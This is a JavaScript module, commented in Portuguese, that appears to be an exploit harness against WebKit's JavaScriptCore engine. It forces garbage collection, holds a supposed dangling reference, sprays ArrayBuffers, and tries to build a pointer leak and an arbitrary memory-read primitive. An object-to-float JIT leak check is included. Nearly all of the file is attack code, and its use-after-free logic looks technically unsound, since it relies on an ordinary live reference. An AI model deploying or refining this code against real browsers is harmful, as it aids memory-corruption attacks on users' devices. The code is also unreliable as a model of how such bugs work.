// js/test.bundle.mjs

// --- Importações de outros pacotes (com nomes atualizados) ---
import { log as log, PAUSE, Int64, toHex, isInt64, getElement } from './utils.bundle.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from './config.mjs';

// --- Início de s3_utils.mjs (Simplificado) ---
export const SHORT_PAUSE = 50;
export const MEDIUM_PAUSE = 500;

// Renomeado de logS3 para logTest
export const logTest = (message, type = 'info', funcName = '') => {
    log('output-advanced', message, type, funcName); // Usa a função 'log' base
};

// Renomeado de PAUSE_S3 para pauseTest
export const pauseTest = (ms = SHORT_PAUSE) => PAUSE(ms);


// --- Início de testArrayBufferVictimCrash.mjs (Renomeado) ---
export const FNAME_MODULE_UAF = "UAF_Test_R54_Hyper_GC";

// Renomeado de int64ToDouble para int64ToFloat
function int64ToFloat(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

// Renomeado de executeTypedArrayVictimAddrofAndWebKitLeak_R43 para runUAFTest
// *** AGORA ACEITA O NÚMERO DE ITERAÇÕES ***
export async function runUAFTest(gcIterations) {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF;
    logTest(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: (R54) com ${gcIterations} iterações ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];

    try {
        logTest("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
        await triggerAggressiveGC(gcIterations); // Passa o valor

        logTest("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = createDanglingPointer(); // Renomeado
        logTest("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        
        logTest("--- FASE 3: Múltiplas chamadas de GC para garantir a liberação ---", "subtest");
        await triggerAggressiveGC(gcIterations); // Passa o valor
        await pauseTest(100); 
        await triggerAggressiveGC(gcIterations); // Passa o valor
        logTest("    Memória do objeto-alvo deve ter sido liberada.", "warn");

        logTest("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        for (let i = 0; i < 1024; i++) {
            const buf = new ArrayBuffer(136); 
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n;
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logTest(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando...`, "info");

        logTest(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");

        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        
        logTest("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");

        const leaked_ptr_double = dangling_ref.corrupted_prop;
        const buf_conv = new ArrayBuffer(8);
        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
        const int_view = new Uint32Array(buf_conv);
        const leaked_addr = new Int64(int_view[0], int_view[1]); // Renomeado
        logTest(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
        
        logTest("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
        let corrupted_buffer = null;
        for (const buf of spray_buffers) {
            const view = new BigUint64Array(buf);
            if (view[0] !== 0x4141414141414141n) {
                logTest("Encontrado o ArrayBuffer corrompido!", "good");
                corrupted_buffer = buf;
                break;
            }
        }

        if (!corrupted_buffer) {
            throw new Error("Não foi possível encontrar o buffer corrompido.");
        }

        const target_address_to_read = new Int64("0x00000000", "0x08000000"); // Renomeado
        dangling_ref.prop_b = int64ToFloat(target_address_to_read); // Renomeado

        const hacked_view = new DataView(corrupted_buffer);
        const read_value = hacked_view.getUint32(0, true); 

        logTest(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
        logTest(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
            leaked_addr: leaked_addr.toString(true),
            arb_read_test_value: toHex(read_value)
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logTest(final_result.message, "critical");
    }

    logTest(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    // Retorna um objeto simplificado para o orquestrador
    return final_result; 
}

// Renomeado de triggerGC_Hyper para triggerAggressiveGC
// *** AGORA ACEITA O NÚMERO DE ITERAÇÕES ***
async function triggerAggressiveGC(iterations) {
    logTest(`    Acionando GC Agressivo com ${iterations} iterações...`, "info");
    try {
        const gc_trigger_arr = [];
        // O loop agora usa o valor do input, não mais 1000 fixo
        for (let i = 0; i < iterations; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * i)); 
            gc_trigger_arr.push(new Array(1024 * i).fill(0));
        }
    } catch (e) {
        logTest(`    Memória esgotada durante o GC (esperado).`, "info");
    }
    await pauseTest(500); // Renomeado
}

// Renomeado de sprayAndCreateDanglingPointer para createDanglingPointer
function createDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0x11111111, prop_b: 0x22222222, 
            corrupted_prop: 0.12345,
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}


// --- Início de runAllAdvancedTestsS3.mjs (Renomeado) ---

// Renomeado de testJITBehavior para checkJIT
async function checkJIT() {
    logTest("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'checkJIT');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    logTest("Escrevendo um objeto em um Float64Array...", 'info', 'checkJIT');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new Int64(low, high); // Renomeado
    
    logTest(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor: ${leaked_val.toString(true)})`, 'leak', 'checkJIT');

    if (high === 0x7ff80000 && low === 0) {
        logTest("CONFIRMADO: O JIT converteu o objeto para NaN.", 'good', 'checkJIT');
    } else {
        logTest("INESPERADO: O JIT não converteu para NaN.", 'warn', 'checkJIT');
    }
    logTest("--- Teste de Comportamento do JIT Concluído ---", 'test', 'checkJIT');
}

// Renomeado de runHeisenbugReproStrategy_TypedArrayVictim_R43 para runUAFStrategy
async function runUAFStrategy(gcIterations) {
    const FNAME_RUNNER = "runUAFStrategy"; 
    logTest(`==== INICIANDO Estratégia de UAF (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    // Passa o gcIterations para a função de teste principal
    const result = await runUAFTest(gcIterations); 
    const module_name_for_title = FNAME_MODULE_UAF;

    if (result.success) {
        logTest(`  RUNNER: Teste UAF: ${result.message}`, "vuln", FNAME_RUNNER);
        document.title = `${module_name_for_title}: SUCCESS!`;
    } else {
        logTest(`  RUNNER: Teste UAF ERRO: ${String(result.message)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    }
    
    logTest(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await pauseTest(MEDIUM_PAUSE); // Renomeado
    logTest(`==== Estratégia de UAF (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

// Esta é a função principal exportada que o index.html chama
// Renomeado de runAllAdvancedTestsS3 para runAllTests
export async function runAllTests(gcIterations) {
    const FNAME_ORCHESTRATOR = `UAF_MainOrchestrator`;
    logTest(`==== INICIANDO Script Principal (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    await checkJIT(); // Renomeado
    await pauseTest(500); // Renomeado
    
    // Passa o gcIterations para a estratégia
    await runUAFStrategy(gcIterations); 
    
    logTest(`\n==== Script Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    
    const runBtn = getElement('runIsolatedTestBtn'); 
    if (runBtn) runBtn.disabled = false;
}
